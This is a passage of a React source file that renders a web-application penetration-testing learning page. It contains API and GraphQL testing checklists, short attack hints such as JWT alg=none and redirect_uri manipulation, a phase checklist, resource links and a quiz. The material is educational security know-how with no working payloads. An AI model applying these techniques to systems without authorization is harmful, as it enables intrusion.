            <Grid container spacing={3}>
              {/* REST API Testing */}
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, bgcolor: alpha("#06b6d4", 0.05), border: `1px solid ${alpha("#06b6d4", 0.2)}`, borderRadius: 2, height: "100%" }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#06b6d4", mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <HttpIcon /> REST API Testing
                  </Typography>
                  <List dense disablePadding>
                    {[
                      "Test all HTTP methods (GET, POST, PUT, DELETE, PATCH, OPTIONS)",
                      "Check for BOLA/IDOR on every endpoint with IDs",
                      "Test rate limiting and quota enforcement",
                      "Verify authentication on all endpoints",
                      "Test for mass assignment vulnerabilities",
                      "Check pagination bypass (negative offset, large limits)",
                      "Test API versioning bypass (v1 vs v2 endpoints)",
                      "Look for hidden endpoints via wordlist fuzzing",
                    ].map((item, i) => (
                      <ListItem key={i} disableGutters sx={{ py: 0.5 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <CheckCircleIcon sx={{ fontSize: 14, color: "#06b6d4" }} />
                        </ListItemIcon>
                        <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>

              {/* GraphQL Testing */}
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 3, bgcolor: alpha("#8b5cf6", 0.05), border: `1px solid ${alpha("#8b5cf6", 0.2)}`, borderRadius: 2, height: "100%" }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#8b5cf6", mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <DataObjectIcon /> GraphQL Testing
                  </Typography>
                  <List dense disablePadding>
                    {[
                      "Test introspection: query { __schema { types { name } } }",
                      "Check authorization on nested fields",
                      "Test batch queries for rate limit bypass",
                      "Look for DoS via deep nesting or aliases",
                      "Test mutations for privilege escalation",
                      "Check for field suggestions revealing schema",
                      "Test for directive injection",
                      "Enumerate using InQL or GraphQL Voyager",
                    ].map((item, i) => (
                      <ListItem key={i} disableGutters sx={{ py: 0.5 }}>
                        <ListItemIcon sx={{ minWidth: 24 }}>
                          <CheckCircleIcon sx={{ fontSize: 14, color: "#8b5cf6" }} />
                        </ListItemIcon>
                        <ListItemText primary={item} primaryTypographyProps={{ variant: "body2" }} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>

              {/* API Authentication Testing */}
              <Grid item xs={12}>
                <Paper sx={{ p: 3, bgcolor: alpha("#f59e0b", 0.05), border: `1px solid ${alpha("#f59e0b", 0.2)}`, borderRadius: 2 }}>
                  <Typography variant="h6" sx={{ fontWeight: 700, color: "#f59e0b", mb: 2 }}>
                     API Authentication Vulnerabilities
                  </Typography>
                  <Grid container spacing={2}>
                    {[
                      { vuln: "API Key Exposure", desc: "Keys hardcoded in client code, git repos, or headers", test: "Search JS bundles, check public repos" },
                      { vuln: "JWT Weaknesses", desc: "Weak signing, alg confusion, no expiration", test: "Try alg=none, test HS256/RS256 confusion" },
                      { vuln: "OAuth Misconfig", desc: "Missing state, open redirect, token leakage", test: "Test redirect_uri manipulation" },
                      { vuln: "Broken Auth Flows", desc: "Password reset via API, MFA bypass", test: "Test OTP reuse, flow stepping" },
                      { vuln: "API Key in URL", desc: "Keys passed in query strings leak via logs", test: "Check for ?api_key= patterns" },
                      { vuln: "Insufficient Token Scope", desc: "Tokens with excessive permissions", test: "Test token across endpoints/roles" },
                    ].map((item, i) => (
                      <Grid item xs={12} sm={6} md={4} key={i}>
                        <Box sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05), borderRadius: 1 }}>
                          <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b" }}>{item.vuln}</Typography>
                          <Typography variant="caption" sx={{ color: "grey.400", display: "block" }}>{item.desc}</Typography>
                          <Typography variant="caption" sx={{ color: "#22c55e", fontFamily: "monospace", fontSize: "0.7rem" }}>Test: {item.test}</Typography>
                        </Box>
                      </Grid>
                    ))}
                  </Grid>
                </Paper>
              </Grid>
            </Grid>
          </Paper>
        </Box>

        {/* Testing Workflow Section */}
        <Box id="workflow" sx={{ mt: 4 }}>
          <Paper
            sx={{
              p: 4,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#ec4899", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, display: "flex", alignItems: "center", gap: 1 }}>
               Testing Workflow and Reporting
            </Typography>
            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
              Professional pentesting requires structured methodology, safe exploitation, and clear
              communication of findings to stakeholders.
            </Typography>
            <TopicAccordion topics={workflowTopics} defaultExpanded />
          </Paper>
        </Box>

        {/* Tools & Payloads Section */}
        <Box id="tools" sx={{ mt: 4 }}>
          <Paper sx={{ p: 4, borderRadius: 3, bgcolor: "#0f1024", border: `1px solid ${alpha("#06b6d4", 0.3)}` }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 1, color: "#e0e0e0" }}>
              Modern Web App Targets
            </Typography>
        <Typography variant="body1" sx={{ color: "grey.400", mb: 3 }}>
          Many web apps depend on APIs, real-time channels, and cloud services. These areas add new attack surface
          beyond classic server-rendered pages.
        </Typography>
        <Grid container spacing={3}>
          {modernTargets.map((target) => (
            <Grid item xs={12} md={6} key={target.title}>
              <Paper
                sx={{
                  p: 2.5,
                  borderRadius: 2,
                  height: "100%",
                  border: `1px solid ${alpha(target.color, 0.2)}`,
                }}
              >
                <Box sx={{ display: "flex", alignItems: "flex-start", gap: 1.5, mb: 1.5 }}>
                  <Box
                    sx={{
                      width: 36,
                      height: 36,
                      borderRadius: 2,
                      bgcolor: alpha(target.color, 0.1),
                      display: "flex",
                      alignItems: "center",
                      justifyContent: "center",
                      color: target.color,
                    }}
                  >
                    {target.icon}
                  </Box>
                  <Box>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>
                      {target.title}
                    </Typography>
                    <Typography variant="body2" color="text.secondary">
                      {target.description}
                    </Typography>
                  </Box>
                </Box>
                <List dense disablePadding>
                  {target.checks.map((check) => (
                    <ListItem key={check} disableGutters sx={{ py: 0.35 }}>
                      <ListItemIcon sx={{ minWidth: 24 }}>
                        <CheckCircleIcon sx={{ fontSize: 14, color: target.color }} />
                      </ListItemIcon>
                      <ListItemText primary={check} primaryTypographyProps={{ variant: "body2" }} />
                    </ListItem>
                  ))}
                </List>
              </Paper>
            </Grid>
          ))}
        </Grid>
      </Paper>

      {/* Quick Reference */}
      <Paper sx={{ mt: 4, p: 4, borderRadius: 3, bgcolor: "#0f1024", border: `1px solid ${alpha("#f59e0b", 0.3)}` }}>
        <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#e0e0e0" }}>
          Quick Reference: Testing Checklist
        </Typography>
        <Grid container spacing={3}>
          {[
            {
              phase: "Pre-Engagement",
              items: ["Scope definition", "Authorization docs", "Rules of engagement", "Emergency contacts"],
              color: "#6366f1",
            },
            {
              phase: "Reconnaissance",
              items: ["Subdomain enum", "Tech fingerprint", "Endpoint discovery", "API mapping"],
              color: "#8b5cf6",
            },
            {
              phase: "Authentication",
              items: ["Login bypass", "Session tests", "MFA bypass", "OAuth flows"],
              color: "#3b82f6",
            },
            {
              phase: "Authorization",
              items: ["IDOR tests", "Privilege escalation", "Role bypass", "API authz"],
              color: "#10b981",
            },
            {
              phase: "Injection",
              items: ["SQLi all params", "XSS contexts", "Command injection", "SSTI"],
              color: "#ef4444",
            },
            {
              phase: "Reporting",
              items: ["PoC creation", "Impact assessment", "Remediation advice", "Executive summary"],
              color: "#f59e0b",
            },
          ].map((phase) => (
            <Grid item xs={12} sm={6} md={4} key={phase.phase}>
              <Card
                sx={{
                  height: "100%",
                  borderTop: `4px solid ${phase.color}`,
                  borderRadius: 2,
                }}
              >
                <CardContent>
                  <Typography variant="subtitle1" sx={{ fontWeight: 700, mb: 1.5, color: phase.color }}>
                    {phase.phase}
                  </Typography>
                  {phase.items.map((item) => (
                    <Box key={item} sx={{ display: "flex", alignItems: "center", gap: 1, mb: 0.5 }}>
                      <Box
                        sx={{
                          width: 16,
                          height: 16,
                          border: `2px solid ${alpha(phase.color, 0.3)}`,
                          borderRadius: 0.5,
                        }}
                      />
                      <Typography variant="body2">{item}</Typography>
                    </Box>
                  ))}
                </CardContent>
              </Card>
            </Grid>
          ))}
          </Grid>
          </Paper>
        </Box>

        {/* Resources Section */}
        <Box id="resources" sx={{ mt: 4 }}>
          <Paper sx={{ p: 4, borderRadius: 3, bgcolor: "#0f1024", border: `1px solid ${alpha("#3b82f6", 0.3)}` }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 3, color: "#e0e0e0", display: "flex", alignItems: "center", gap: 2 }}>
              <DescriptionIcon sx={{ color: "#3b82f6" }} />
              Essential Resources
            </Typography>
            <Grid container spacing={2}>
              {[
                { name: "OWASP Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", desc: "Comprehensive web security testing methodology", color: "#ef4444" },
                { name: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security", desc: "Free interactive labs for all attack types", color: "#f59e0b" },
                { name: "HackTricks", url: "https://book.hacktricks.xyz/", desc: "Practical hacking tricks and techniques", color: "#22c55e" },
                { name: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings", desc: "Payload collections for various attacks", color: "#8b5cf6" },
                { name: "OWASP Cheat Sheet Series", url: "https://cheatsheetseries.owasp.org/", desc: "Quick reference for secure development", color: "#06b6d4" },
                { name: "Bug Bounty Hunting Essentials", url: "https://www.bugcrowd.com/hackers/bugcrowd-university/", desc: "Bug bounty methodology and tips", color: "#ec4899" },
              ].map((resource) => (
                <Grid item xs={12} sm={6} key={resource.name}>
                  <Paper
                    sx={{
                      p: 2,
                      borderRadius: 2,
                      bgcolor: alpha(resource.color, 0.08),
                      border: `1px solid ${alpha(resource.color, 0.2)}`,
                      cursor: "pointer",
                      transition: "all 0.2s",
                      "&:hover": {
                        borderColor: resource.color,
                        transform: "translateY(-2px)",
                      },
                    }}
                    onClick={() => window.open(resource.url, "_blank")}
                  >
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: resource.color }}>
                      {resource.name} 
                    </Typography>
                    <Typography variant="body2" sx={{ color: "grey.400" }}>
                      {resource.desc}
                    </Typography>
                  </Paper>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* Related Learning Pages */}
          <Paper
            sx={{
              p: 4,
              mt: 3,
              borderRadius: 3,
              bgcolor: "#0f1024",
              border: `1px solid ${alpha("#8b5cf6", 0.3)}`,
            }}
          >
            <Typography variant="h5" sx={{ fontWeight: 700, color: "#e0e0e0", mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
              <AssignmentIcon sx={{ color: "#8b5cf6" }} />
              Related Learning Topics
            </Typography>

            <Grid container spacing={2}>
              {[
                {
                  title: "SQL Injection Guide",
                  desc: "Deep dive into SQL injection techniques, detection, and prevention",
                  link: "/learn/sql-injection",
                  color: "#ef4444",
                  icon: <StorageIcon />,
                },
                {
                  title: "XSS Attack Guide",
                  desc: "Cross-site scripting fundamentals, payloads, and remediation",
                  link: "/learn/xss",
                  color: "#f59e0b",
                  icon: <JavascriptIcon />,
                },
                {
                  title: "Command Injection",
                  desc: "OS command injection techniques and secure coding practices",
                  link: "/learn/command-injection",
                  color: "#22c55e",
                  icon: <TerminalIcon />,
                },
                {
                  title: "OWASP Top 10",
                  desc: "Understanding the most critical web application security risks",
                  link: "/learn/owasp-top-10",
                  color: "#8b5cf6",
                  icon: <SecurityIcon />,
                },
                {
                  title: "API Testing Guide",
                  desc: "REST and GraphQL API security testing methodology",
                  link: "/learn/api-testing",
                  color: "#06b6d4",
                  icon: <HttpIcon />,
                },
                {
                  title: "Burp Suite Mastery",
                  desc: "Advanced techniques for the industry-standard web proxy",
                  link: "/learn/burp-suite",
                  color: "#ec4899",
                  icon: <BugReportIcon />,
                },
              ].map((item) => (
                <Grid item xs={12} sm={6} md={4} key={item.title}>
                  <Card
                    component={Link}
                    to={item.link}
                    sx={{
                      height: "100%",
                      bgcolor: alpha(item.color, 0.08),
                      border: `1px solid ${alpha(item.color, 0.2)}`,
                      borderRadius: 2,
                      textDecoration: "none",
                      transition: "all 0.2s",
                      "&:hover": {
                        bgcolor: alpha(item.color, 0.15),
                        borderColor: item.color,
                        transform: "translateY(-2px)",
                      },
                    }}
                  >
                    <CardContent>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1.5, mb: 1.5 }}>
                        <Box sx={{ color: item.color }}>{item.icon}</Box>
                        <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#e0e0e0" }}>
                          {item.title}
                        </Typography>
                      </Box>
                      <Typography variant="body2" sx={{ color: "grey.400" }}>
                        {item.desc}
                      </Typography>
                    </CardContent>
                  </Card>
                </Grid>
              ))}
            </Grid>
          </Paper>
        </Box>

        {/* Quiz Section */}
        <Box id="quiz" sx={{ mt: 4 }}>
          <QuizSection
            questions={quizPool}
            accentColor={ACCENT_COLOR}
            title="Web App Pentesting Knowledge Check"
            description="Random 10-question quiz drawn from a 75-question bank each time the page loads."
            questionsPerQuiz={QUIZ_QUESTION_COUNT}
          />
        </Box>

        {/* Bottom Navigation */}
        <Box sx={{ mt: 4, textAlign: "center" }}>
          <Button
            variant="outlined"
            startIcon={<ArrowBackIcon />}
            onClick={() => navigate("/learn")}
            sx={{ borderColor: "#ef4444", color: "#ef4444", "&:hover": { bgcolor: alpha("#ef4444", 0.1), borderColor: "#f87171" } }}
          >
            Back to Learning Hub
          </Button>
        </Box>

        </Grid>
      </Grid>
      </Container>

      {/* Mobile Navigation Drawer */}
      <Drawer
        anchor="left"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        sx={{
          display: { xs: "block", md: "none" },
          "& .MuiDrawer-paper": {
            width: 280,
            bgcolor: "#12121a",
            borderRight: `1px solid ${alpha(ACCENT_COLOR, 0.2)}`,
          },
        }}
      >
        <Box sx={{ p: 2 }}>
          <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "center", mb: 2 }}>
            <Typography variant="h6" sx={{ fontWeight: 700, color: ACCENT_COLOR }}>
              Contents
            </Typography>
            <IconButton onClick={() => setNavDrawerOpen(false)} sx={{ color: "grey.400" }}>
              <CloseIcon />
            </IconButton>
          </Box>
          {sidebarNav}
        </Box>
      </Drawer>

      {/* Floating Action Buttons */}
      {isMobile && (
        <>
          <Fab
            size="medium"
            onClick={() => setNavDrawerOpen(true)}
            sx={{
              position: "fixed",
              bottom: 80,
              right: 16,
              bgcolor: ACCENT_COLOR,
              color: "white",
              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.8) },
            }}
          >
            <ListAltIcon />
          </Fab>
          <Fab
            size="small"
            onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
            sx={{
              position: "fixed",
              bottom: 24,
              right: 16,
              bgcolor: alpha(ACCENT_COLOR, 0.2),
              color: ACCENT_COLOR,
              "&:hover": { bgcolor: alpha(ACCENT_COLOR, 0.3) },
            }}
          >
            <KeyboardArrowUpIcon />
          </Fab>
        </>
      )}
    </Box>
    </LearnPageLayout>
  );
}
